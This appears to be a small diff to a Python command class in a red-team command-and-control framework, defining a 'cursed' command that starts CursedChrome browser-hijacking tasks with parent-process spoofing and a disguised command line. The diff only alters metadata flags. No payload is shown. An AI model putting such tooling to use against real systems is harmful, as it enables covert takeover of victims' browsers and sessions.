@@ -100,18 +100,13 @@ class CursedCommand(CommandBase):
     cursed [-path C:\Users\checkymander\chrome] [-parent 1234] [-cmdline "nothing to see here"] [-target ws://127.0.0.1:1234] [-debug_port 9222]"""
     description = "Initiate CursedChrome based tasking."
     version = 1
-    is_exit = False
-    is_file_browse = False
-    is_process_list = False
-    is_download_file = False
-    is_upload_file = False
-    is_remove_file = False
     author = "@checkymander"
+    supported_ui_features = ["task_response:interactive"]
     argument_class = CursedArguments
     attackmapping = ["T1059"]
     attributes = CommandAttributes(
         load_only=False,
-        builtin=True
+        builtin=False
     )
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
         response = PTTaskCreateTaskingMessageResponse(
